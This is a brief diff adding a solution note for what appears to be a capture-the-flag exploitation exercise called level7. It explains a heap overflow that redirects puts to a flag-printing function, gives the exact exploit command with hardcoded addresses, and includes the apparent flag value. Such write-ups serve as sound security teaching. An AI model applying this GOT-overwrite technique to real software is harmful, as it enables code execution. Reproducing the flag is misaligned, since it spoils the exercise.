@@ -1,0 +1,8 @@
+(wip)
+use the first argument to overide the adress of the second malloc with the adress of puts 
+use the second argument to swap the address of puts with the adress of m in the second strcpy
+when puts is called it will instead call the fonction m who will print the flag
+
+./level7 `python -c 'print "A" * 20 + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`
+
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
